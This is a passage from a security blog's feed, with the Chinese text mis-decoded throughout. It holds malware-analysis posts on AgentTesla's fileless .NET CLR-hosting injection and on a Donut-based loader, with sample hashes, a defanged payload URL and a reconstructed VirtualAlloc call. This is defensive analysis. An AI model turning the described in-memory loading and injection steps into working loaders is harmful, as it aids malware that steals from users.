title="è°ƒç”¨å…¥å£ç‚¹ï¼š"></a>è°ƒç”¨å…¥å£ç‚¹ï¼š</h2><p>pMethodInfo-&gt;Invoke_3(VARIANT()ã€SafeArray_Pointer_To_Arguementã€&amp;VARIANT())</p><p>â€œInvoke_3â€å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯æŒ‡å‘å°†ä¼ é€’ç»™ MSIL æœ‰æ•ˆè´Ÿè½½çš„å‚æ•°çš„ SafeArray æŒ‡é’ˆã€‚</p><h1 id="ShellCode-ä½¿ç”¨-CLR-æ‰˜ç®¡ä»æœ¬æœºä»£ç æ‰§è¡Œæ‰˜ç®¡ä»£ç "><a href="#ShellCode-ä½¿ç”¨-CLR-æ‰˜ç®¡ä»æœ¬æœºä»£ç æ‰§è¡Œæ‰˜ç®¡ä»£ç " class="headerlink" title="ShellCode ä½¿ç”¨ CLR æ‰˜ç®¡ä»æœ¬æœºä»£ç æ‰§è¡Œæ‰˜ç®¡ä»£ç "></a><strong>ShellCode ä½¿ç”¨ CLR æ‰˜ç®¡ä»æœ¬æœºä»£ç æ‰§è¡Œæ‰˜ç®¡ä»£ç </strong></h1><p>æ¥ä¸‹æ¥ï¼Œshellcode è°ƒç”¨ mscoree.dll ä¸­çš„â€œCLRCreateInstanceâ€ APIã€‚CLRCreateInstance API è¿”å›æ–°çš„ CLR MetaHost å®ä¾‹ï¼Œæ¶æ„è½¯ä»¶å°†ä½¿ç”¨è¯¥å®ä¾‹å‡†å¤‡è¿è¡Œæ—¶ï¼Œä»¥ä¾¿åœ¨å†…å­˜ä¸­æ‰§è¡Œ MSIL AgentTesla Payloadã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä»ä¸‹å›¾ä¸­çœ‹åˆ°ï¼Œåœ¨æ£€ç´¢ CLR æ‰˜ç®¡æ¥å£æ—¶ä½¿ç”¨äº†å¤šä¸ª GUIDï¼Œä¾‹å¦‚ï¼Œä¸ºäº†æ£€ç´¢â€œICorRuntimeHostâ€æ¥å£ï¼Œå®ƒå°†â€œCLSID_CorRuntimeHostâ€ã€â€œIID_ICorRuntimeHostâ€ä½œä¸ºå‚æ•°ä¼ é€’ç»™â€œGetInterfaceâ€APIã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-7-GUID-used-while-CLR-hosting.png" alt="img"></p><p>å›¾ 7ï¼šCLR æ‰˜ç®¡æ—¶ä½¿ç”¨çš„ GUID</p><p>æ¥ä¸‹æ¥ï¼Œshellcode æ£€ç´¢ ICorRuntimeHost æ¥å£å¹¶å¯åŠ¨ CLRã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-8-Call-to-GetInterface-API-to-retrieve-the-ICorRuntimeHost-interface-1030x397.png" alt="Figure-8-Call-to-GetInterface-API-to-retrieve-the-ICorRuntimeHost-interface-1030x397"></p><p>å›¾ 8ï¼šè°ƒç”¨ GetInterface API æ¥æ£€ç´¢ ICorRuntimeHost æ¥å£</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250823120018642.png" alt="image-20250823120018642"></p><p>å›¾ 9ï¼šä» ICorRuntimeHost æ¥å£è°ƒç”¨ start æ–¹æ³•æ¥å¯åŠ¨ CLR</p><p>æ¥ä¸‹æ¥ï¼Œshellcode æ£€ç´¢å½“å‰è¿›ç¨‹çš„é»˜è®¤åº”ç”¨ç¨‹åºåŸŸï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-10-Retrieve-the-default-AppDomain-for-the-current-process-1030x249.png" alt="img"></p><p>å›¾ 10ï¼šæ£€ç´¢å½“å‰è¿›ç¨‹çš„é»˜è®¤ AppDomainã€‚</p><p>æ¥ä¸‹æ¥ï¼Œshellcode ä½¿ç”¨â€œSafeArrayCreateâ€ API åˆ›å»º SafeArrayï¼Œå¹¶å°†æ‰˜ç®¡ä»£ç çš„å¤§å°è®¾ç½®ä¸º 0x3CC00ã€‚æ­¤ SafeArray åŒ…å«ä¸€ä¸ªæŒ‡å‘ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œæ¶æ„è½¯ä»¶ä¼šå°† MSIL Payload å¤åˆ¶åˆ°è¯¥ç¼“å†²åŒºä¸­ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-11-Create-a-SafeArray-and-copy-AgentTesla-payload-to-it-1030x534.png" alt="img"></p><p>å›¾ 11ï¼šåˆ›å»º SafeArray å¹¶å°† AgentTesla Payload å¤åˆ¶åˆ°å…¶ä¸­</p><p>ä¸€æ—¦åˆ›å»ºäº† SafeArrayï¼Œå°±å¯ä»¥ä½¿ç”¨â€œLoad_3â€æ–¹æ³•å°†å…¶åŠ è½½åˆ° AppDomain ä¸­ï¼Œæ­¤â€œLoad_3â€æ–¹æ³•æä¾›æŒ‡å‘ Assembly å¯¹è±¡çš„æŒ‡é’ˆã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-12-Calls-Load_3-method-to-load-the-SafeArray-into-AppDomain-1030x254.png" alt="img"></p><p>å›¾ 12ï¼šè°ƒç”¨â€œLoad_3â€æ–¹æ³•å°† SafeArray åŠ è½½åˆ° AppDomain ä¸­</p><p>æ¥ä¸‹æ¥ï¼Œshellcode å°†è§£å¯†åŒºåŸŸä¸­çš„ MSIL æœ‰æ•ˆè´Ÿè½½æ¸…é›¶ï¼Œç„¶åä½¿ç”¨â€œSafeArrayDestroyâ€API é”€æ¯ SafeArrayã€‚</p><p>æœ€åï¼Œshellcode æ£€ç´¢ç¨‹åºé›†çš„å…¥å£ç‚¹å¹¶è°ƒç”¨â€œInvoke_3â€æ–¹æ³•åœ¨ 64 ä½æœ¬æœºè¿›ç¨‹ä¸Šä¸‹æ–‡ä¸­å¯åŠ¨ 32 ä½ MSIL AgentTesla è¿›ç¨‹ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-13-starts-the-MSIL-AgentTesla-process-1030x220.png" alt="img"></p><p>å›¾ 13ï¼šå¯åŠ¨ MSIL AgentTesla è¿›ç¨‹</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-14-Browser-folder-enumerated-by-64-bit-process-once-the-fileless-managed-code-injection-has-been-done-1030x507.png" alt="img"></p><p>å›¾ 14ï¼šæ— æ–‡ä»¶æ‰˜ç®¡ä»£ç æ³¨å…¥å®Œæˆåï¼Œ64 ä½è¿›ç¨‹æšä¸¾çš„æµè§ˆå™¨æ–‡ä»¶å¤¹</p><p>åœ¨ä¸Šå›¾ 14 ä¸­ï¼Œçœ‹èµ·æ¥ 64 ä½è¿›ç¨‹æ­£åœ¨æšä¸¾æµè§ˆå™¨æ–‡ä»¶å¤¹ï¼Œä½†å…¶ AgentTesla æ¶æ„è½¯ä»¶åœ¨ .NET å¼•æ“å†…å¼€å§‹æ‰§è¡Œã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h1&gt;&lt;p&gt;SonicWall Capture Labs å¨èƒç ”ç©¶å›¢é˜Ÿåœ¨æœ¬æœº 64 ä½è¿›ç¨‹ä¸­è§‚å¯Ÿåˆ°æ— æ–‡ä»¶ .Net æ‰˜ç®¡ä»£ç æ³¨å…¥ã€‚æœ¬æœºä»£ç æˆ–éæ‰˜ç®¡ä»£ç æ˜¯</summary>
      
    
    
    
    <category term="æ¶æ„æ ·æœ¬åˆ†æ" scheme="https://250wuyifan.github.io/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="æ¶æ„æ ·æœ¬åˆ†æ" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>é’ˆå¯¹dountçš„ä¸€æ¬¡æ¶æ„æ ·æœ¬åˆ†æ</title>
    <link href="https://250wuyifan.github.io/2025/08/18/%E9%92%88%E5%AF%B9dount%E7%9A%84%E4%B8%80%E6%AC%A1%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>https://250wuyifan.github.io/2025/08/18/%E9%92%88%E5%AF%B9dount%E7%9A%84%E4%B8%80%E6%AC%A1%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</id>
    <published>2025-08-18T08:55:07.000Z</published>
    <updated>2025-08-22T07:36:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="A-Mega-Malware-Analysis-Tutorial-Featuring-Donut"><a href="#A-Mega-Malware-Analysis-Tutorial-Featuring-Donut" class="headerlink" title="A Mega Malware Analysis Tutorial Featuring Donut"></a>A Mega Malware Analysis Tutorial Featuring Donut</h1><h2 id="æ ·æœ¬åˆ†æ"><a href="#æ ·æœ¬åˆ†æ" class="headerlink" title="æ ·æœ¬åˆ†æ"></a>æ ·æœ¬åˆ†æ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sha256å¦‚ä¸‹</span><br><span class="line"></span><br><span class="line">1d450fb80ff070385e88ab624a387d72abd9d9898109b5c5ebd35c5002223359</span><br></pre></td></tr></table></figure><h3 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h3><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨UNIX&#x2F;Windowsçš„FILEç¨‹åºæ¥çœ‹æ–‡ä»¶ç±»å‹ï¼Œè¾“å‡ºâ€œPE32å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆGUIï¼‰Intel 80386 Mono&#x2F;.Netç¨‹åºé›†ï¼Œç”¨äºMS Windowsâ€è¡¨æ˜æˆ‘ä»¬çš„æ ·æœ¬æ˜¯.NETç¨‹åºé›†</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818170429830.png" alt="image-20250818170429830"></p><p>.NETç¨‹åºé›†æ˜¯ä¸€ç§é€šè¿‡ç¼–è¯‘.NETè¯­è¨€ï¼ˆå¦‚C#ï¼‰ä»£ç ç”Ÿæˆçš„DLLæˆ–EXEæ–‡ä»¶ã€‚ä¸è¿‡ï¼Œå®ƒå¹¶ä¸åŒ…å«æœ¬åœ°x86&#x2F;x64æœºå™¨ç ï¼Œè€Œæ˜¯ä½¿ç”¨MSILï¼ˆå¾®è½¯ä¸­é—´è¯­è¨€ï¼‰å­—èŠ‚ç ã€‚è¿™äº›MSILç”±.NETè¿è¡Œæ—¶æ‰§è¡Œï¼Œå¹¶åœ¨è¿è¡Œæ—¶å°†å…¶ç¼–è¯‘ä¸ºæœ¬åœ°ä»£ç ã€‚</p><p>åˆ†æè¿™ç±»æ–‡ä»¶çš„åˆ©å™¨å½“å±dnSpyâ€”â€”è¿™æ¬¾é›†.NETè°ƒè¯•å™¨ã€æ±‡ç¼–ç¼–è¾‘å™¨å’Œåç¼–è¯‘å™¨åŠŸèƒ½äºä¸€èº«çš„å·¥å…·ã€‚å½“æˆ‘ä»¬æŠŠç¤ºä¾‹æ–‡ä»¶åŠ è½½åˆ°dnSpyæ—¶ï¼Œä¼šç«‹å³å‘ç°æŸäº›å‡½æ•°å’Œå¯¹è±¡çš„åç§°å˜æˆäº†\u0001ã€\u0002ç­‰ä¹±ç å­—ç¬¦ï¼Œè€Œéäººç±»å¯è¯»çš„åç§°ã€‚è¿™è¡¨æ˜è¯¥ç¤ºä¾‹æ–‡ä»¶å·²è¢«æ··æ·†å¤„ç†ã€‚éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œæ–‡ä»¶æ··æ·†æœ¬èº«å¹¶ä¸å…·æœ‰æ¶æ„å±æ€§ï¼Œä¼ä¸šé€šå¸¸ä¼šé€šè¿‡æ··æ·†æŠ€æœ¯æ¥ä¿æŠ¤çŸ¥è¯†äº§æƒã€‚ä¸è¿‡ï¼Œè¿™ç§ç°è±¡ä»å€¼å¾—æˆ‘ä»¬ç‰¹åˆ«ç•™æ„ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818173117091.png" alt="image-20250818173117091"></p><p>æˆ‘ä»¬å°†ä½¿ç”¨de4dotå·¥å…·ï¼Œè¯¥å·¥å…·ç”¨äºæ£€æµ‹å¸¸è§çš„æ··æ·†å™¨å¹¶æ¸…ç†.NETäºŒè¿›åˆ¶æ–‡ä»¶ã€‚é€šè¿‡å°†äºŒè¿›åˆ¶æ–‡ä»¶æ‹–æ”¾åˆ°de4dot.exeä¸­ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818174552590.png" alt="image-20250818174552590"></p><p>ç›®å‰æˆ‘ä»¬å·²å®Œæˆå¯¹æ ·æœ¬çš„åˆæ­¥åˆ†ç±»ã€‚é€šè¿‡æ–‡ä»¶åˆ†æã€dnSpyå’Œde4dotå·¥å…·ï¼Œæˆ‘ä»¬ç¡®è®¤è¯¥æ ·æœ¬ä¸º.NETç¨‹åºé›†ï¼Œæ£€æµ‹åˆ°å…¶å­˜åœ¨æ··æ·†å¤„ç†ï¼Œå¹¶å®Œæˆäº†åæ··æ·†æ“ä½œã€‚åœ¨å®Œæˆåæ··æ·†å¤„ç†åï¼Œç°åœ¨å¯ä»¥å¼€å§‹æ·±å…¥åˆ†æè¿™æ®µä»£ç äº†ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818174735236.png" alt="image-20250818174735236"></p><h3 id="ä½¿ç”¨ç±»å‹å¼•ç”¨æ¥æ¨æ–­åŠŸèƒ½"><a href="#ä½¿ç”¨ç±»å‹å¼•ç”¨æ¥æ¨æ–­åŠŸèƒ½" class="headerlink" title="ä½¿ç”¨ç±»å‹å¼•ç”¨æ¥æ¨æ–­åŠŸèƒ½"></a>ä½¿ç”¨ç±»å‹å¼•ç”¨æ¥æ¨æ–­åŠŸèƒ½</h3><p>åœ¨ <strong>dnSpy</strong> ä¸­ï¼Œ<strong>ç¨‹åºé›†çš„ç±»å‹å¼•ç”¨ï¼ˆType Referencesï¼‰</strong> æ˜¯æŒ‡å½“å‰è¢«åˆ†æçš„ç¨‹åºé›†ï¼ˆAssemblyï¼‰æ‰€ä¾èµ–çš„å…¶ä»–å¤–éƒ¨ç±»å‹ï¼ˆå¦‚ç±»ã€æ¥å£ã€ç»“æ„ä½“ç­‰ï¼‰ï¼Œå…¶å®çœ‹è¿™ä¸ªå°±ç±»ä¼¼äºidaçœ‹å¯¼å…¥å‡½æ•°ä¸€æ ·ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818175742236.png" alt="image-20250818175742236"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818180624704.png" alt="image-20250818180624704"></p><p>å¦‚æœå•å‡»Mcwpgrï¼Œå°†è½¬åˆ°å…¶å‡½æ•°å®šä¹‰ï¼Œåœ¨é‚£é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯¹HttpClientçš„è°ƒç”¨ã€‚</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¯¥ç¤ºä¾‹åˆ›å»ºäº†ä¸€ä¸ªHTTPå®¢æˆ·ç«¯ï¼Œå¹¶ä»hxxpsï¼š&#x2F;&#x2F;bitbucket[.]org&#x2F;veloncontinetaker&#x2F;utencilio&#x2F;downloads&#x2F;Tsudun[.]pdf.ä¸‹è½½äº†æœ‰æ•ˆè½½è·ã€‚é€šè¿‡é™æ€åˆ†ææ£€æŸ¥ç±»å‹å¼•ç”¨ï¼Œæˆ‘ä»¬èƒ½å¤Ÿå¿«é€Ÿé”å®šç¤ºä¾‹ä¸­çš„æœ‰è¶£éƒ¨åˆ†ï¼Œè€Œæ— éœ€ä»å…¥å£ç‚¹è¿½æº¯ä»£ç ã€‚</p><h3 id="è·Ÿè¸ªä»£ç ï¼šè§£å¯†æœ‰æ•ˆè½½è·"><a href="#è·Ÿè¸ªä»£ç ï¼šè§£å¯†æœ‰æ•ˆè½½è·" class="headerlink" title="è·Ÿè¸ªä»£ç ï¼šè§£å¯†æœ‰æ•ˆè½½è·"></a>è·Ÿè¸ªä»£ç ï¼šè§£å¯†æœ‰æ•ˆè½½è·</h3><p>æ—¢ç„¶æˆ‘ä»¬å·²ç»ç¡®å®šè¯¥ç¤ºä¾‹å°è¯•å»ºç«‹HTTPè¿æ¥ï¼Œæˆ‘ä»¬å¸Œæœ›è¿›ä¸€æ­¥äº†è§£è¯¥ç¤ºä¾‹è¯•å›¾ä¸‹è½½çš„æœ‰æ•ˆè½½è·ã€‚æˆ‘ä»¬å¯ä»¥åœ¨dnSpyä¸­è®¾ç½®æ–­ç‚¹å¹¶è¿è¡Œè°ƒè¯•å™¨æ¥å®ç°è¿™ä¸€ç‚¹</p><p>å€¼å¾—åº†å¹¸çš„æ˜¯ï¼Œåˆ†ææ—¶ä»èƒ½è·å–æœ‰æ•ˆè½½è·ï¼ˆSHA256å“ˆå¸Œå€¼ï¼šdaba1c39a042aec4791151dbabd726e0627c3789deea3fc81b66be111e7c263eï¼‰ï¼‰ã€‚ä¸è¿‡ä»æ–‡ä»¶æ‰©å±•åæ¥çœ‹ï¼Œè¿™ä¼¼ä¹å¹¶éPDFæ ¼å¼â€”â€”æ ·æœ¬æ–‡ä»¶å¼€å¤´ç¼ºå°‘é¢„æœŸçš„é­”æœ¯å­—èŠ‚ï¼ˆå³æ–‡ä»¶ç­¾åï¼Œåˆ†æå¸ˆå¸¸ç”¨æ¥è¯†åˆ«æœ‰æ•ˆè½½è·ç±»å‹ï¼‰â€œ25 50 44 46 2Dâ€ï¼ˆæˆ–ä»¥â€œPDF-â€å¼€å¤´ï¼‰ã€‚å®é™…ä¸Šæˆ‘ä»¬æ— æ³•ç¡®å®šå…·ä½“æ–‡ä»¶ç±»å‹ï¼Œå› ä¸ºæ—¢æ²¡æœ‰å¯è¯†åˆ«çš„é­”æœ¯å­—èŠ‚ï¼Œæ‰€æœ‰å­—ç¬¦ä¹Ÿéƒ½å¤„äºASCIIå­—ç¬¦èŒƒå›´ä¹‹å†…ï¼š<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818180749370.png" alt="image-20250818180749370"></p><p>æˆ‘ä»¬éœ€è¦é‡æ–°æ£€æŸ¥åç¼–è¯‘åçš„ä»£ç ï¼Œä»¥ä¾¿æ›´æ·±å…¥åœ°äº†è§£æœ‰æ•ˆè½½è·ã€‚å¦‚æœæˆ‘ä»¬è·³å‡ºä¸‹è½½æ–‡ä»¶çš„æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªçœ‹ä¼¼éå¸¸ç®€å•çš„å­—èŠ‚è½¬æ¢ï¼Œè¿™å¯èƒ½æ˜¯è§£å¯†ä¾‹ç¨‹ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818181056956.png" alt="image-20250818181056956"></p><p>ç„¶åå°±æ˜¯æŸ¥çœ‹æ­¤å‡½æ•°çš„è°ƒç”¨ï¼Œé‡å¤åˆšåˆšçš„åˆ†æï¼Œç„¶åç‚¹å‡»è¢«ä½¿ç”¨ï¼Œ</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818181735675.png" alt="image-20250818181735675"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818181812557.png" alt="image-20250818181812557"></p><p>æœ€åå®šä½åˆ°è¿™ä¸ªï¼Œåœ¨æ­¤ä¸‹æ–­ç‚¹ï¼Œç„¶åæ‰§è¡Œã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818181836701.png" alt="image-20250818181836701"></p><p>ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥è·å–åˆ°ï¼Œè§£å¯†ä¹‹åçš„shellcodeäº†ï¼Œç„¶åè¿›è¡Œä¸‹ä¸€æ­¥åˆ†æï¼Œåˆ†æåˆ°åº•ç¨‹åºåšäº†ä»€ä¹ˆã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818231041100.png" alt="image-20250818231041100"></p><h3 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h3><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818231443210.png" alt="image-20250818231443210"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818231915258.png" alt="image-20250818231915258"></p><p>è¿™æ®µä»£ç å±•ç¤ºäº†ä¸€ä¸ªè°ƒç”¨ <code>VirtualAlloc</code>Windows API å‡½æ•°çš„é—´æ¥è¿‡ç¨‹ã€‚è®©æˆ‘ä»¬é€æ­¥åˆ†æ <code>smethod_9</code>å‡½æ•°çš„åŠŸèƒ½ï¼š</p><p>1.<code>smethod_9</code>å‡½æ•°æ¥æ”¶ä¸€ä¸ªå­—èŠ‚æ•°ç»„å’Œä¸€ä¸ª <code>Class2</code>å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œä½†å®é™…ä¸Šåªä½¿ç”¨äº†å­—èŠ‚æ•°ç»„çš„é•¿åº¦ä¿¡æ¯ã€‚</p><p>2.å®ƒè°ƒç”¨äº† <code>smethod_4</code>å‡½æ•°ï¼Œä¼ é€’äº†ä»¥ä¸‹å‚æ•°ï¼šâ€¢</p><p>4096U (åˆ†é…å†…å­˜çš„åŒºåŸŸç±»å‹ï¼Œé€šå¸¸æ˜¯ MEM_COMMIT)</p><p>â€¢IntPtr.Zero (è®©ç³»ç»Ÿå†³å®šåˆ†é…åœ°å€)</p><p>â€¢byte_0.Length (è¦åˆ†é…çš„å†…å­˜å¤§å°)</p><p>â€¢4U (å†…å­˜ä¿æŠ¤æ ‡å¿—ï¼ŒPAGE_READWRITE)</p><p>3.åœ¨ <code>smethod_4</code>å†…éƒ¨ï¼š</p><p>â€¢åˆ›å»ºäº†ä¸€ä¸ªå‚æ•°æ•°ç»„</p><p>â€¢åŠ¨æ€è§£æäº† â€œVirtualAllocâ€ API å‡½æ•°åï¼ˆé€šè¿‡å­—ç¬¦ä¸²æ›¿æ¢å»æ‰äº†ç‚¹å·ï¼‰</p><p>â€¢ä» kernel32.dll è°ƒç”¨è¿™ä¸ªå‡½æ•°</p><p>4.æœ€ç»ˆæ•ˆæœç­‰åŒäºç›´æ¥è°ƒç”¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void* ptr = VirtualAlloc(NULL, byte_0.Length, MEM_COMMIT, PAGE_READWRITE);</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ <code>smethod_9</code>çš„åŠŸèƒ½æ˜¯ï¼š<strong>åœ¨è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ä¿ç•™å¹¶æäº¤ä¸€å—å¯è¯»å†™çš„å†…å­˜åŒºåŸŸ</strong>ï¼Œå†…å­˜å¤§å°ç­‰äºä¼ å…¥å­—èŠ‚æ•°ç»„çš„é•¿åº¦ï¼Œè¿”å›åˆ†é…çš„å†…å­˜åœ°å€æŒ‡é’ˆã€‚</p><p>è¿™ç§é—´æ¥è°ƒç”¨æ–¹å¼ï¼ˆé€šè¿‡å­—ç¬¦ä¸²æ··æ·†å’ŒåŠ¨æ€è§£æï¼‰é€šå¸¸å‡ºç°åœ¨æ··æ·†&#x2F;ä¿æŠ¤è¿‡çš„ä»£ç ä¸­ï¼Œå¯èƒ½æ˜¯ä¸ºäº†é˜²æ­¢ç®€å•çš„å­—ç¬¦ä¸²æœç´¢è¯†åˆ«å‡º API è°ƒç”¨ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818233308475.png" alt="image-20250818233308475"></p><p>æ ¹æ®æ–‡æ¡£è¯´æ˜ï¼ŒMarshalæ–¹æ³•ä¼šå°†æŒ‡å®šé•¿åº¦çš„å­—èŠ‚å‰¯æœ¬å¤åˆ¶åˆ°ç”±æä¾›çš„æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜åŒºåŸŸã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œè¯¥æ“ä½œå°†è§£å¯†åçš„æœ‰æ•ˆè½½è·å­—èŠ‚å‰¯æœ¬å¤åˆ¶åˆ°åˆšé€šè¿‡VirtualAllocåˆ†é…çš„å†…å­˜åŒºåŸŸã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818233527345.png" alt="image-20250818233527345"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250818233513834.png" alt="image-20250818233513834"></p><p>æ€»ä¹‹ï¼Œæˆ‘ä»¬ä¼šå°†æœ€è¿‘åˆ†é…çš„å†…å­˜æ ‡è®°ä¸ºPAGEExecuteReadã€‚è¿™è¡¨æ˜ï¼Œå¤åˆ¶åˆ°å·²åˆ†é…å†…å­˜ä¸­çš„è§£å¯†æœ‰æ•ˆè½½è·æœ€ç»ˆä¼šè¢«æ‰§è¡Œï¼Œè¿™æ„å‘³ç€ä»äº’è”ç½‘ä¸‹è½½çš„æœ‰æ•ˆè½½è·å®é™…ä¸Šæ˜¯shellcodeï¼Œæ— è®ºåœ¨å†…å­˜ä¸­çš„ä½ç½®å¦‚ä½•ï¼Œéƒ½å¯ä»¥è¿è¡Œã€‚</p><h3 id="é™æ€åˆ†ææ€»ç»“"><a href="#é™æ€åˆ†ææ€»ç»“" class="headerlink" title="é™æ€åˆ†ææ€»ç»“"></a>é™æ€åˆ†ææ€»ç»“</h3><p>æœ¬èŠ‚æ€»ç»“å¦‚ä¸‹ï¼š1.ä½¿ç”¨æ–‡ä»¶å·¥å…·ç¡®è®¤æ ·æœ¬ä¸º.NETç¨‹åºé›†ï¼›2.é€šè¿‡de4dotå·¥å…·è§£é™¤æ··æ·†å¤„ç†ï¼›3.åˆ©ç”¨dnSpyæ£€æµ‹åˆ°æ ·æœ¬ä»äº’è”ç½‘ä¸‹è½½æœ‰æ•ˆè½½è·ï¼›4.è¿ç”¨dnSpyè°ƒè¯•åŠŸèƒ½å®Œæˆæœ‰æ•ˆè½½è·çš„ä¸‹è½½ä¸è§£å¯†ï¼›5.ç¡®è®¤æ ·æœ¬å°†è§£å¯†åçš„æœ‰æ•ˆè½½è·åŠ è½½è‡³å†…å­˜å¹¶æ‰§è¡Œã€‚</p><h2 id="è°ƒè¯•æœ¬åœ°ä»£ç çš„æ‰§è¡Œ"><a href="#è°ƒè¯•æœ¬åœ°ä»£ç çš„æ‰§è¡Œ" class="headerlink" title="è°ƒè¯•æœ¬åœ°ä»£ç çš„æ‰§è¡Œ"></a>è°ƒè¯•æœ¬åœ°ä»£ç çš„æ‰§è¡Œ</h2><p>å¼€å¤´å…ˆä»‹ç»ä¸€ä¸‹**æ‰˜ç®¡ä»£ç ï¼ˆmanaged codeï¼‰ä¸éæ‰˜ç®¡ä»£ç ï¼ˆunmanaged codeï¼‰**çš„æ¦‚å¿µã€‚å¾®è½¯æä¾›çš„è¿™ä»½èµ„æ–™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å…¥é—¨æŒ‡å—ï¼Œä½†ç®€å•æ¥è¯´ï¼š</p><p>â€¢æ‰˜ç®¡ä»£ç **ï¼ˆé€šå¸¸ç”¨ C# ç­‰è¯­è¨€ç¼–å†™ï¼‰è¿è¡Œåœ¨**å…¬å…±è¯­è¨€è¿è¡Œæ—¶ï¼ˆCLRï¼‰ç¯å¢ƒä¸­ï¼Œç”± CLR è´Ÿè´£å†…å­˜ç®¡ç†å’Œå®‰å…¨æ€§ã€‚</p><p>â€¢éæ‰˜ç®¡ä»£ç ï¼ˆé€šå¸¸ç”¨ C æˆ– C++ ç¼–å†™ï¼‰åˆ™ç›´æ¥ç”±æ“ä½œç³»ç»Ÿæ‰§è¡Œï¼Œå› æ­¤éœ€è¦ç¨‹åºæ‰‹åŠ¨ç®¡ç†å†…å­˜ã€‚</p><p>ä¹‹æ‰€ä»¥æåˆ°è¿™ä¸€ç‚¹ï¼Œæ˜¯å› ä¸ºè¯¥æ ·æœ¬çš„æ‰§è¡Œå·²ä»<strong>æ‰˜ç®¡ä»£ç åˆ‡æ¢åˆ°äº†éæ‰˜ç®¡ä»£ç </strong>ã€‚åœ¨ä¸Šä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°æ 